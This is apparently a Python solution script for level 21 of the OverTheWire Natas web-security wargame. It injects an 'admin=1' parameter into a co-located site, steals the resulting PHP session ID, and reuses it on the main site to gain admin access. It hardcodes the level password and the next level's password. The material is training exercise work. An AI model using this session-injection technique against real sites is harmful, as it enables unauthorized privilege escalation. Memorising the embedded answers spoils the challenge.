import requests

level = str(21)
pw = "IFekPyrQXftziDEsUr3x21sYuahypdgJ"

url = "http://natas21-experimenter.natas.labs.overthewire.org/index.php"


s = requests.Session()
s.auth = ('natas'+level, pw)
params = (("debug", "true"), ("align", "center"), ("fontsize", "99%"), ("bgcolor", "yellow"),("admin","1"),("submit","true"))


r = s.get(url, params=params)

print(r.headers)
cookie = r.headers['Set-Cookie']
session_id = cookie.split(":").__getitem__(0)
session_id = session_id.split("=").__getitem__(1)[:-6]
cookie = {"PHPSESSID": session_id}


r = s.get(url, params=params, cookies = cookie)
print(r.text)

url = "http://natas21.natas.labs.overthewire.org/index.php"


r = s.get(url, params=params, cookies = cookie)
print(r.text)



# chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
